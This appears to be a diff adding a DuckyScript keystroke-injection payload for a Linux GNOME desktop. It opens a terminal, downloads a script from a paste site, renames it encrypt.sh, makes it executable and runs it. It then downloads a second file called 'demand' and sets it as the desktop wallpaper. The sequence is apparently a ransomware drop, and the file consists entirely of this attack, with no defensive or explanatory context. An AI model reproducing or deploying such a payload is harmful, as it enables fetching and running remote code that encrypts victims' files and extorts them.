@@ -1,0 +1,32 @@
+DEFINE #MY1D CornedTwigs
+DEFINE #MY2D GrilledTower
+
+DEFAULT_DELAY 200
+DELAY 1000
+GUI a
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING wget https://paste.c-net.org/#MY1D
+ENTER
+DELAY 1500
+STRING mv #MY1D encrypt.sh
+ENTER
+STRING chmod 700 encrypt.sh
+ENTER
+STRING wget https://paste.c-net.org/#MY2D
+ENTER
+DELAY 1500
+STRING mv #MY2D demand
+ENTER
+STRING gsettings set org.gnome.desktop.background picture-uri demand
+ENTER
+STRING ./encrypt.sh
+ENTER
+STRING y
+ENTER
+DELAY 300
+STRING exit
+ENTER
+
